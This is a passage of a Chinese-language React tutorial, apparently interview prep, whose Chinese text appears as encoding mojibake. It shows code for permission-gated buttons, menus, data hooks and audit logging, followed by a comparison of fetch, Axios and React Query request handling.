class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">useCachedPermission</span> = (<span class="hljs-params">permission, ttl = <span class="hljs-number">5000</span></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>(&#123;&#125;);<br>  <br>  <span class="hljs-keyword">const</span> check = <span class="hljs-title function_">useCallback</span>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <br>    <span class="hljs-keyword">if</span> (cache[permission] &amp;&amp; cache[permission].<span class="hljs-property">expires</span> &gt; now) &#123;<br>      <span class="hljs-keyword">return</span> cache[permission].<span class="hljs-property">result</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">checkPermission</span>(permission);<br>    <span class="hljs-title function_">setCache</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123;<br>      ...prev,<br>      [permission]: &#123; result, <span class="hljs-attr">expires</span>: now + ttl &#125;<br>    &#125;));<br>    <br>    <span class="hljs-keyword">return</span> result;<br>  &#125;, [permission, ttl, cache]);<br>  <br>  <span class="hljs-keyword">return</span> check;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">DeleteButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> checkDeletePermission = <span class="hljs-title function_">useCachedPermission</span>(<span class="hljs-string">&#x27;delete_item&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [disabled, setDisabled] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">checkDeletePermission</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">hasPermission</span> =&gt;</span> &#123;<br>      <span class="hljs-title function_">setDisabled</span>(!hasPermission);<br>    &#125;);<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">disabled</span>=<span class="hljs-string">&#123;disabled&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleDelete&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span></span><br><span class="language-xml">      åˆ é™¤</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šåŠ¨æ€èœå•æƒé™æ§åˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŠ¨æ€ç”Ÿæˆèœå•</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useAuthorizedMenu</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">const</span> [menuItems, setMenuItems] = <span class="hljs-title function_">useState</span>([]);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadMenu</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-keyword">const</span> allItems = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getMenuItems</span>();<br>      <br>      <span class="hljs-keyword">const</span> authorizedItems = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(<br>        allItems.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">async</span> item =&gt; &#123;<br>          <span class="hljs-keyword">if</span> (!item.<span class="hljs-property">permission</span>) <span class="hljs-keyword">return</span> item;<br>          <br>          <span class="hljs-keyword">const</span> hasPerm = <span class="hljs-keyword">await</span> permissionService.<span class="hljs-title function_">checkPermission</span>(<br>            item.<span class="hljs-property">permission</span><br>          );<br>          <span class="hljs-keyword">return</span> hasPerm ? item : <span class="hljs-literal">null</span>;<br>        &#125;)<br>      );<br>      <br>      <span class="hljs-title function_">setMenuItems</span>(authorizedItems.<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>));<br>    &#125;;<br>    <br>    <span class="hljs-title function_">loadMenu</span>();<br>  &#125;, [user]);<br>  <br>  <span class="hljs-keyword">return</span> menuItems;<br>&#125;;<br><br><span class="hljs-comment">// èœå•ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AppSidebar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> menuItems = <span class="hljs-title function_">useAuthorizedMenu</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">        &#123;menuItems.map(item =&gt; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;item.path&#125;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&#123;item.path&#125;</span>&gt;</span>&#123;item.title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">        ))&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å®‰å…¨å¢å¼ºæªæ–½"><a href="#å®‰å…¨å¢å¼ºæªæ–½" class="headerlink" title="å®‰å…¨å¢å¼ºæªæ–½"></a>å®‰å…¨å¢å¼ºæªæ–½</h3><p><strong>æ•æ„Ÿæ•°æ®ä¿æŠ¤</strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨æƒé™hookå°è£…æ•°æ®è¯·æ±‚</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useProtectedData</span> = (<span class="hljs-params">endpoint, requiredPermission</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">usePermission</span>(requiredPermission);<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (hasPermission) &#123;<br>      <span class="hljs-title function_">fetch</span>(endpoint)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>        .<span class="hljs-title function_">then</span>(setData);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">setData</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// æ¸…é™¤å·²æœ‰æ•°æ®</span><br>    &#125;<br>  &#125;, [hasPermission, endpoint]);<br>  <br>  <span class="hljs-keyword">return</span> hasPermission ? data : <span class="hljs-literal">null</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±æƒé™å®¡è®¡æ—¥å¿—</strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœ¨è·¯ç”±å®ˆå«ä¸­æ·»åŠ æ—¥å¿—</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">RouteGuard</span> = (<span class="hljs-params">&#123; children, roles &#125;</span>) =&gt; &#123;<br>  <span class="hljs-comment">// ...æƒé™æ£€æŸ¥é€»è¾‘</span><br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (isAuthenticated) &#123;<br>      auditService.<span class="hljs-title function_">logRouteAccess</span>(<br>        location.<span class="hljs-property">pathname</span>, <br>        user.<span class="hljs-property">id</span>,<br>        hasPermission ? <span class="hljs-string">&#x27;GRANTED&#x27;</span> : <span class="hljs-string">&#x27;DENIED&#x27;</span><br>      );<br>    &#125;<br>  &#125;, [location]);<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æƒé™å˜æ›´å¼ºåˆ¶åˆ·æ–°</strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç›‘å¬æƒé™å˜æ›´</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePermissionChange</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-comment">// æ˜¾ç¤ºåˆ·æ–°æç¤º</span><br>    <span class="hljs-title function_">setShowRefresh</span>(<span class="hljs-literal">true</span>);<br>  &#125;;<br>  <br>  permissionService.<span class="hljs-title function_">onChange</span>(handlePermissionChange);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> permissionService.<span class="hljs-title function_">offChange</span>(handlePermissionChange);<br>&#125;, []);<br><br><span class="hljs-comment">// åœ¨UIä¸­æ˜¾ç¤ºæç¤º</span><br>&#123;showRefresh &amp;&amp; (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;refresh-banner&quot;</span>&gt;</span></span><br><span class="language-xml">    æ‚¨çš„æƒé™å·²æ›´æ–°ï¼Œè¯·</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> window.location.reload()&#125;&gt;</span><br><span class="language-xml">      åˆ·æ–°é¡µé¢</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    ä»¥åº”ç”¨æ›´æ”¹</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>)&#125;<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“-5"><a href="#æ€»ç»“-5" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>æ ¸å¿ƒæ¨¡å¼ï¼š<ul><li>é«˜é˜¶ç»„ä»¶(HOC)æ¨¡å¼ï¼šé€‚åˆç±»ç»„ä»¶åœºæ™¯</li><li>åŒ…è£…å™¨ç»„ä»¶ï¼šå‡½æ•°ç»„ä»¶æ¨èæ–¹æ¡ˆ</li><li>è·¯ç”±å…ƒæ•°æ®ï¼šReact Router 6.4+æœ€ä½³å®è·µ</li></ul></li><li>æƒé™æ¨¡å‹ï¼š<ul><li>RBACï¼šåŸºäºè§’è‰²çš„æƒé™æ§åˆ¶ï¼ˆé€‚åˆå¤§å¤šæ•°åœºæ™¯ï¼‰</li><li>ABACï¼šåŸºäºå±æ€§çš„åŠ¨æ€æƒé™æ§åˆ¶ï¼ˆå¤æ‚ç³»ç»Ÿé€‚ç”¨ï¼‰</li></ul></li><li>ä¼ä¸šçº§æ–¹æ¡ˆï¼š<ul><li>JWTè®¤è¯é›†æˆ</li><li>æƒé™å˜æ›´å®æ—¶å“åº”</li><li>åŠ¨æ€èœå•æ§åˆ¶</li><li>å®¡è®¡æ—¥å¿—è¿½è¸ª</li></ul></li><li>é¢è¯•é‡ç‚¹ï¼š<ul><li>è·¯ç”±çº§ vs ç»„ä»¶çº§æƒé™æ§åˆ¶</li><li>æƒé™å˜æ›´åçš„çŠ¶æ€åŒæ­¥</li><li>æŒ‰é’®çº§æƒé™çš„æ€§èƒ½ä¼˜åŒ–</li><li>åŠ¨æ€èœå•çš„å®ç°æ–¹æ¡ˆ</li></ul></li></ul><h2 id="6-4-æ•°æ®è¯·æ±‚æ–¹æ¡ˆï¼ˆfetchã€axiosã€React-Queryã€SWRï¼‰"><a href="#6-4-æ•°æ®è¯·æ±‚æ–¹æ¡ˆï¼ˆfetchã€axiosã€React-Queryã€SWRï¼‰" class="headerlink" title="6.4 æ•°æ®è¯·æ±‚æ–¹æ¡ˆï¼ˆfetchã€axiosã€React Queryã€SWRï¼‰"></a>6.4 æ•°æ®è¯·æ±‚æ–¹æ¡ˆï¼ˆfetchã€axiosã€React Queryã€SWRï¼‰</h2><h3 id="æ•°æ®è¯·æ±‚æ ¸å¿ƒæ–¹æ¡ˆå¯¹æ¯”"><a href="#æ•°æ®è¯·æ±‚æ ¸å¿ƒæ–¹æ¡ˆå¯¹æ¯”" class="headerlink" title="æ•°æ®è¯·æ±‚æ ¸å¿ƒæ–¹æ¡ˆå¯¹æ¯”"></a>æ•°æ®è¯·æ±‚æ ¸å¿ƒæ–¹æ¡ˆå¯¹æ¯”</h3><table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="left">ç‰¹ç‚¹</th><th align="left">é€‚ç”¨åœºæ™¯</th><th align="left">åŒ…å¤§å°</th></tr></thead><tbody><tr><td align="left">åŸç”Ÿ fetch</td><td align="left">æµè§ˆå™¨åŸç”Ÿ APIï¼Œæ— éœ€å®‰è£…</td><td align="left">ç®€å•è¯·æ±‚ã€ç°ä»£æµè§ˆå™¨é¡¹ç›®0kB</td><td align="left"></td></tr><tr><td align="left">Axios</td><td align="left">åŠŸèƒ½ä¸°å¯Œã€æ‹¦æˆªå™¨ã€è‡ªåŠ¨è½¬æ¢ JSON</td><td align="left">ä¼ä¸šçº§åº”ç”¨ã€å¤æ‚è¯·æ±‚å¤„ç†4.8kB</td><td align="left"></td></tr><tr><td align="left">React Query</td><td align="left">æ•°æ®ç¼“å­˜ã€è‡ªåŠ¨é‡è¯•ã€è¯·æ±‚ç®¡ç†</td><td align="left">å¤æ‚æ•°æ®äº¤äº’ã€å®æ—¶åº”ç”¨11.8kB</td><td align="left"></td></tr><tr><td align="left">SWR</td><td align="left">è½»é‡çº§ã€å¿«é€Ÿé›†æˆã€æ™ºèƒ½ç¼“å­˜</td><td align="left">å¿«é€Ÿå¼€å‘ã€ä¸­å°å‹é¡¹ç›®3.5kB</td><td align="left"></td></tr></tbody></table><h3 id="åŸºç¡€è¯·æ±‚æ–¹æ¡ˆæ·±åº¦è§£æ"><a href="#åŸºç¡€è¯·æ±‚æ–¹æ¡ˆæ·±åº¦è§£æ" class="headerlink" title="åŸºç¡€è¯·æ±‚æ–¹æ¡ˆæ·±åº¦è§£æ"></a>åŸºç¡€è¯·æ±‚æ–¹æ¡ˆæ·±åº¦è§£æ</h3><p><strong>Fetch API</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸºç¡€ GET è¯·æ±‚</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP error! status: <span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-keyword">return</span> data;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch error:&#x27;</span>, error);<br>    <span class="hljs-keyword">throw</span> error;<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// POST è¯·æ±‚ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">postData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">payload</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>      <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;token&#125;</span>`</span><br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)<br>  &#125;);<br>  <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ul><li>ä¼˜ç‚¹ï¼šæµè§ˆå™¨åŸç”Ÿæ”¯æŒã€Promise æ¥å£</li><li>ç¼ºç‚¹ï¼šæ— è¯·æ±‚å–æ¶ˆã€æ— è¶…æ—¶æ§åˆ¶ï¼ˆéœ€æ‰‹åŠ¨å®ç°ï¼‰</li><li>å…³é”®é…ç½®ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è¶…æ—¶æ§åˆ¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchWithTimeout</span> = (<span class="hljs-params">url, options = &#123;&#125;, timeout = <span class="hljs-number">8000</span></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([<br>    <span class="hljs-title function_">fetch</span>(url, options),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">_, reject</span>) =&gt;</span> <br>      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Request timeout&#x27;</span>)), timeout)<br>    )<br>  ]);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Axios é«˜çº§åº”ç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºå®ä¾‹</span><br><span class="hljs-keyword">const</span> api = axios.<span class="hljs-title function_">create</span>(&#123;<br>  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">&#x27;https://api.example.com&#x27;</span>,<br>  <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<span class="hljs-string">&#x27;X-Custom-Header&#x27;</span>: <span class="hljs-string">&#x27;value&#x27;</span>&#125;<br>&#125;);<br><br><span class="hljs-comment">// è¯·æ±‚æ‹¦æˆªå™¨</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (token) &#123;<br>    config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;token&#125;</span>`</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> config;<br>&#125;, <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error));<br><br><span class="hljs-comment">// å“åº”æ‹¦æˆªå™¨</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<br>  <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-property">data</span>,<br>  <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">response</span>?.<span class="hljs-property">status</span> === <span class="hljs-number">401</span>) &#123;<br>      <span class="hljs-comment">// å¤„ç†æœªæˆæƒ</span><br>      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);<br>  &#125;<br>);<br><br><span class="hljs-comment">// å–æ¶ˆä»¤ç‰Œ</span><br><span class="hljs-keyword">const</span> source = axios.<span class="hljs-property">CancelToken</span>.<span class="hljs-title function_">source</span>();<br>api.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/data&#x27;</span>, &#123; <span class="hljs-attr">cancelToken</span>: source.<span class="hljs-property">token</span> &#125;);<br>source.<span class="hljs-title function_">cancel</span>(<span class="hljs-string">&#x27;Operation canceled by user&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ul><li>è‡ªåŠ¨è½¬æ¢ JSON æ•°æ®</li><li>å®¢æˆ·ç«¯ XSRF é˜²æŠ¤</li><li>å¹¶å‘è¯·æ±‚æ”¯æŒ (axios.all)</li><li>ä¸Šä¼ è¿›åº¦ç›‘æ§</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">api.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/upload&#x27;</span>, formData, &#123;<br>  <span class="hljs-attr">onUploadProgress</span>: <span class="hljs-function"><span class="hljs-params">progressEvent</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> percent = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<br>      (progressEvent.<span class="hljs-property">loaded</span> * <span class="hljs-number">100</span>) / progressEvent.<span class="hljs-property">total</span><br>    );<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Upload progress: <span class="hljs-subst">$&#123;percent&#125;</span>%`</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="ç°ä»£æ•°æ®ç®¡ç†åº“æ·±åº¦è§£æ"><a href="#ç°ä»£æ•°æ®ç®¡ç†åº“æ·±åº¦è§£æ" class="headerlink" title="ç°ä»£æ•°æ®ç®¡ç†åº“æ·±åº¦è§£æ"></a>ç°ä»£æ•°æ®ç®¡ç†åº“æ·±åº¦è§£æ</h3><p><strong>React Query æ ¸å¿ƒæ¦‚å¿µ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useQuery, useMutation, <span class="hljs-title class_">QueryClient</span>, <span class="hljs-title class_">QueryClientProvider</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-query&#x27;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºæŸ¥è¯¢å®¢æˆ·ç«¯</span><br><span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title 